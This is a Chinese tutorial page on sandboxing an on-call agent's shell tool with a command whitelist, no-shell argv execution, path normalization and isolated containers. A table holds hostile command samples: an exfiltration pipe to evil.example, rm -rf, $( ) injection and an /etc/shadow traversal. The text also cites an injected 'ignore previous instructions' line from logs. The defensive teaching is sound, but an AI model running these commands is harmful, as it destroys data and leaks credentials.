沙箱：只读优先、命令白名单、隔离执行

工具的参数是模型写的，等于不可信输入：日志里一句“忽略之前的指令”，模型就可能照做。沙箱的思路是不去猜它会写什么坏命令，而是只放行列出来的好命令：能只读就只读；命令和选项走白名单、不经过 shell；文件只能在指定目录里；放行的再关进断网、只读的容器里跑。前几关负责把理由清楚地告诉模型，最后一关负责在前几关有漏洞时兜底。

这一页的位置站 04 下钻第 7 页。上一页补给 Linux 进程、权限与容器隔离 讲了笼子怎么造；这一页把笼子接到 agent 的工具上。下一页 危险操作先问人 管“能做但该不该现在做”。

①为什么需要：模型的参数是不可信输入

值班助手 v1 的工具是写死的函数，参数只有关键字和时间，本来就很安全。可值班的人总想让它多干点：df -h 看磁盘、grep 一下别的日志、wc -l 数个行数。于是有人加了一个 run_command(cmd)。现在模型写的字符串直接变成进程；而模型读到的日志、知识库、工单内容，任何一段都可能夹着一句指令（工具怎么设计 · 反例 5）。

②没有它会怎样：shell=True 原样执行

模型提议的命令直接 subprocess.run(cmd, shell=True) 会怎样
grep -c ERROR /logs/app.log; rm -rf /logs先数完 ERROR，再把日志目录删了
grep -c ERROR /logs/app.log | curl -d @- http://evil.example结果被 POST 到外网
grep $(cat /etc/passwd) /logs/app.logshell 先执行 $( ) 里的命令，再拼进去
tail -n 5 /logs/../../etc/shadow“在 /logs 下”的字符串，实际指向系统文件
find /logs -delete黑名单里没有 rm，照样删光
tail -f /logs/app.log永远不退出，卡住这一轮
不懂精华时的典型误用：维护一个“危险命令黑名单”（rm、curl、wget……）。Claude 官方文档对 bash 工具的安全建议写得很直白：要用白名单，拒绝 shell 操作符，黑名单是不够的。坏命令的写法是无穷的，好命令只有你列出来的那几个。

③相邻方案：给模型多大的手

做法灵活安全适合
只给专门函数（v1 的做法）只能做你写好的事最安全：参数只有关键字和时间主力：SOP 里固定的步骤
白名单命令 + 选项 + 路径，容器里执行能组合几个只读命令三关 + 容器兜底补充：值班时临时想看一眼的东西
容器里跑任意命令（只靠容器）什么都能干容器配对了就伤不到宿主，但伤得到挂进去的东西；拒绝理由模型也看不懂一次性的分析环境
托管的代码执行（Claude 的 code_execution 工具）能写代码分析数据跑在 Anthropic 的容器里，碰不到你的系统分析你上传的文件，而不是查你的线上

本页做第二行：主力仍是专门函数；run_command 作为补充，三道关 + 容器。官方的 agent 设计指南给过同样的取舍：要拦截、审批、审计、并行的动作，就从 bash 里升格成专门工具（工具怎么设计 · ③）。

④原理：先分级，再过三道关，最后进笼子

先知道这些
  • shell 会解释特殊字符：; 接下一条命令，| 接管道，$( ) 先执行里面的命令，> 写文件。不经过 shell、直接传 argv 列表，这些字符就只是普通字符。
  • 容器的那组参数：断网、只读根、nobody、去能力、限内存和进程数。见补给页 Linux 进程、权限与容器隔离。
  • 回执里的错误信息模型会读：拒绝的理由要写成它能照着改的话（一来一回 · 坑 5）。

机制 1 · 只读优先：先给动作分级

不是所有工具都需要同样的防护。按“出了错能不能撤回”分三级，越往后限制越多（官方 agent 设计指南也拿“可逆性”当分级标准）：

级别值班助手里的例子怎么处理
只读查日志、解析 GC、看线程栈、run_command 的白名单命令沙箱里自动执行
有影响但可恢复heap_dump（停顿几秒）、调日志级别先问人（下一页）
不可逆重启、扩缩容、删数据、发通知给客户v1 根本不给；以后给也要审批 + 二次确认

Java 比方：数据库账号分只读账号和读写账号，报表系统只拿只读账号。比方失效的地方：数据库替你检查权限，而命令行工具的“只读”要靠你自己挑：find 能 -delete，tar 能写文件，看起来只读的工具也可能有写的选项。

机制 2 · 三道关：每一关只回答一个问题

  • 第一关 · 不过 shell：用 shlex.split 拆成 argv 列表，subprocess.run(argv) 直接执行，不用 shell=True。字符串里一出现 shell 特殊字符就拒，因为合法的白名单命令用不到它们。
  • 第二关 · 命令和选项白名单：grep 只认 -c -i -E -m -n，tail 只认 -n。选项也要列，因为很多“只读”命令藏着危险选项：tail -f 不退出，find -delete 删文件，find -exec 能执行任何命令。
  • 第三关 · 路径：先把 . 和 .. 消掉（/logs/../../etc/shadow → /etc/shadow），再判断是不是在 /logs 之下。官方文档对文件类工具的要求一样：先规范化，再用 is_relative_to 判断，不能只比字符串前缀。

机制 3 · 隔离执行：前三关漏了，笼子兜底

三道关是对字符串做的检查，它看不见文件系统：日志目录里如果有一个指向 /etc/shadow 的符号链接，/logs/shadow-link 这个字符串完全合规（⑤ 实测就放行了）。所以放行的命令仍然进容器跑：容器里只挂了 /logs，链接指向的是容器自己的 /etc/shadow，进程又是 nobody，读不到（实测 Permission denied）。外面再套超时，超时后按名字 docker kill。

为什么这样设计：精确的关 + 粗暴的笼子

选中的：白名单检查 + 容器

  • 白名单是“列举好的”，有限、可审计；黑名单是“列举坏的”，永远列不完。
  • 字符串检查能给出精确的拒绝理由，模型读得懂、能改；容器给不了理由，但不依赖检查写得对不对。
  • 两层各有盲区（检查看不见文件系统，容器挡不住挂进去的东西被读），叠起来才严。
  • 代价：每条命令多 0.2 秒起容器（实测）；白名单要随需求维护。

被放弃的：只靠一层

  • 只靠检查：一个没想到的选项（find -exec）或符号链接就穿过去，后面什么都没有。
  • 只靠容器：挂进去的日志照样能被读走、能被拿来做别的事；拒绝时模型只看到一串退出码。
  • 只靠提示词（“请勿执行危险命令”）：注入的那句话就是冲着它来的。
决定胜负的约束：参数可能是攻击者写的，而任何一层检查都可能有没想到的洞。所以每一层都假设前一层会漏：这就是纵深防御。Java 里你见过同样的结构：参数校验（@Valid）+ 预编译 SQL（防注入）+ 数据库账号最小权限，三层各管一件事。

FORBIDDEN = set("|;&`$<>(){}\\\n")
ALLOW = {"grep": {"-c", "-i", "-E", "-m=", "-n"}, "tail": {"-n="}, "head": {"-n="}, "wc": {"-l"}, "df": {"-h"}}

def check(cmd):
    if set(cmd) & FORBIDDEN:  raise Rejected("含有 shell 特殊字符，一次只能跑一个命令")   # 第一关
    prog, *args = shlex.split(cmd)
    if prog not in ALLOW:      raise Rejected(f"{prog} 不在白名单里；能用的只有 ...")       # 第二关
    ...                                                                                    # 选项逐个比对
    for p in paths:
        if LOG_ROOT not in normalize(p).parents: raise Rejected(f"路径 {p} 不在 /logs 里")   # 第三关
    return [prog, *args]

读出来的结论
  • 9 条越界和注入全拦在前三关，拒绝理由都能直接回给模型：哪一关、为什么、能用什么。
  • 符号链接那条穿过了前三关（字符串看不出是链接），进容器后被拦：链接指向容器自己的文件系统，进程又是 nobody。这就是“笼子兜底”。
  • 放行的命令每条约 0.22 秒，大部分是起容器的开销；和模型一轮几秒到几十秒比，付得起。
到这里已经能交差了：run_command 只放行列出来的只读命令，参数越界就拒并说明原因，执行在断网只读的容器里。

⑥细节

第一圈 · 注意事项

1还是用了 shell=True← ④ 机制 2
现象
检查通过的字符串交给 shell=True 执行，引号、反斜杠、换行的各种边角让检查和 shell 的理解不一致，被绕过。
根源
检查器和 shell 对同一个字符串的“解析”不是同一套规则。
做法
检查和执行用同一份 argv：shlex.split 一次，检查这个列表，执行也传这个列表。
2白名单命令自带“执行别的命令”的选项← ④ 机制 2
现象
白名单里放了 find、awk、less 或 git，结果 find -exec、awk 'BEGIN{system(...)}'、git -c core.pager=... 都能跑任意命令。
根源
很多常用工具能间接执行命令、读写任意文件；只白名单命令名、不白名单选项，等于没白名单。
做法
选项也逐个列；本身就是“小语言”的工具（awk、sed、find、git）别放进来，需要时写成专门函数。
3路径只比字符串前缀← ④ 机制 2
现象
"/logs-old/x".startswith("/logs") 是 True；/logs/../etc 也以 /logs 开头。
根源
路径是有结构的，不是普通字符串。
做法
先规范化（消掉 ..），再看 /logs 是不是它的父目录（Path.is_relative_to 或 parents）；真实路径的符号链接问题交给容器只挂 /logs。实验台里可以试 /logs-old。
4符号链接穿过了路径检查实测← ④ 机制 3
现象
/logs/shadow-link 字符串合规，指向的却是 /etc/shadow。
根源
不碰文件系统的检查看不见链接；在宿主上 resolve() 又有“检查时和使用时不一致”的竞争。
做法
在执行环境里兜底：容器只挂需要的目录、只读、nobody。这样链接最多指到容器自己的文件。
5放行的命令输出几万行← ④ 机制 1
现象
grep -E . /logs/app.log 合规，返回 50 MB，回执撑爆上下文。
根源
只读不等于便宜；沙箱管安全，不管体积。
做法
输出截断到固定长度并说明“共 N 行，只返回前 50 行，请用 -m 或更精确的模式”；grep 强制带 -m（工具怎么设计 · 返回）。
6为了省 0.2 秒复用一个长期运行的沙箱容器← ④ 机制 3
现象
上一次排查写进 /tmp 的东西，被下一次排查读到了。
根源
长期容器有状态，命令之间不再隔离。
做法
默认一条命令一个 --rm 容器；真要复用，至少一次排查一个容器、排查结束就删。

第二圈 · 使用规范

  • 白名单放配置，改它要评审：防有人为了“方便”顺手加进 find。
  • 每次执行记一行审计：原始字符串、argv、哪一关拒的、退出码、耗时：防出了事查不到是谁、做了什么。被拒的记录本身就是“有人在试探”的信号。
  • 拒绝理由写给模型看：说清哪一关、为什么、能用什么，防它换着花样重试同一件事。
  • 沙箱只解决“能不能做”：有副作用的动作还要过审批（下一页），防“能做”被当成“该做”。

第三圈 · 深处

Claude 的 bash 工具也是这么要求的

Anthropic 定义的 bash_20250124 工具是“客户端执行”的：模型给命令，执行在你这边，Anthropic 不提供沙箱。官方的安全建议就是本页这几条：放进隔离环境（容器、虚拟机或受限用户）、命令白名单、拒绝 shell 操作符、设超时和资源上限、每条命令记日志，并明确说黑名单不够。

文件类工具：路径的老问题

官方给文本编辑器工具的要求：把模型给的 path 规范化后确认仍在项目根目录之下，拒绝 ..、符号链接、根目录外的绝对路径，以及 URL 编码的穿越写法（%2e%2e%2f）；不要直接拿原始 path 去 open。和 Web 开发里防目录穿越是同一件事。

实验台：这条命令停在哪一关？

先猜：grep -c ERROR /logs-old/app.log（目录名以 /logs 开头）会怎样？

页面里的检查是把 ⑤ 的 sandbox.py 的 check() 翻译成 JavaScript（引号处理做了简化）；放行之后在容器里会怎样，这里不执行，只说明。试试 grep -E 耗时|超时：正则里的 | 也被第一关拦下，这是白名单误伤合法写法的代价，真需要就写成专门函数。

  • 有副作用的动作：能做，但该不该现在做（危险操作先问人）。
  • 按服务限定能读的目录：问的是 pay-svc，就只挂 pay-svc 的日志（全景的“下一圈”）。
  • MCP 服务器的权限：工具变成独立服务以后，沙箱边界在哪一侧（站 07）。

↺回到⑤：改一改

  1. 补上 -m：让 grep 不带 -m 就拒（或自动补 -m 50），并把输出截断到 1500 字、末尾注明总行数（坑 5）。
  2. 试一个前缀陷阱：在 CASES 里加 grep -c ERROR /logs-old/app.log，确认第三关拦下；再把 normalize 的判断改成 startswith("/logs")，看它是不是放行了（坑 3）。

自测

1. 用一句话说出这一页的精华

模型给的参数是不可信输入：能只读就只读，命令和选项走白名单、不经 shell、路径限定在目录里，放行的再关进容器；前几关给模型讲理由，笼子在前几关漏了时兜底。

2. 为什么不用黑名单？

坏命令的写法无穷（rm 换 find -delete、换 python），黑名单永远列不完；白名单只放行你列出来的有限几个，可审计。官方文档也明确说黑名单不够。

3. 为什么检查完了还要进容器？

字符串检查看不见文件系统（符号链接）、也可能漏想某个选项；容器不依赖检查写得对不对，只挂需要的目录、断网、nobody，把漏网之鱼能造成的影响压到最小。

从 ④ 机制 3 和 ⑤ 的符号链接实测推出。

4. 预测：白名单里加上 find（只允许 -name），find /logs -name x -exec rm {} + 会怎样？

第二关拦下：-exec 不在允许的选项里。但如果只白名单了命令名没白名单选项，它就能删光日志（容器里日志是只读挂载，删不掉，但能执行任何别的命令）。

从 ④ 机制 2 和坑 2 推出。

5. 预测：去掉第一关，只用 subprocess.run(argv)（不经 shell），grep -c ERROR /logs/app.log; rm -rf /logs 会怎样？

不经 shell 时 ; 只是普通字符，shlex.split 会把 /logs/app.log;、rm、-rf 都当成 grep 的参数；第二关会因为 -rf 不是允许的选项而拒。第一关的价值在于更早、更清楚地给出理由。

从 ④ 机制 2 推出。

6. 放回全景：第 6 站沙箱拦下了一条命令，第 7、8 站会怎样？

第 7 站把“没有执行：……”作为 is_error 的回执送回；第 8 站照常检查上限，进下一轮，模型按理由换一个合规的写法或者换工具。连续被拒很多次，会撞上步数闸。

档位：标准。本机跑过（2026-11-24，Ubuntu 22.04，Docker 27.3.1，alpine:3.20，Python 3.13）：⑤ 的 13 条命令过三道关和容器，每条容器执行约 0.22 秒，符号链接被容器挡下。按文档（Claude 官方工具调用文档中 bash 和文本编辑器工具的安全要求、agent 设计指南的可逆性分级）：隔离环境、白名单、拒绝 shell 操作符、黑名单不够、路径规范化后判断。实验台是 check() 的 JavaScript 版，引号处理比 shlex 简化。
